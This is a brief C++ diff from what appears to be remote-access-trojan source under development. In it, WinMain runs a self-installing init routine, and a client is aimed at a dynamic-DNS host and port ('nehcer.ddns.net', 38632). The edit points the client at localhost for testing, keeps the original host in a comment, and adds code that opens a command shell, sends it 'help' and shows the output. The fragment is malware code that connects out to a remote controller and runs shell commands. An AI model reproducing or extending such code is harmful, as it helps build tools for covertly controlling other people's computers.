@@ -27,7 +27,12 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdL
 	if (General::init())	//runs init() and exits file if it installs itself (starts new file)
 		return 0;
 
-	Client MyClient("nehcer.ddns.net", 38632);
+	Client MyClient("127.0.0.1", 1111); //Client MyClient("nehcer.ddns.net", 38632);
+	CMD cmd;
+	cmd.cmdOpen = true;
+	Sleep(2000);
+	cmd.writeCMD("help");
+	testMB(cmd.readCMD());
 
 	while (true)
 	{
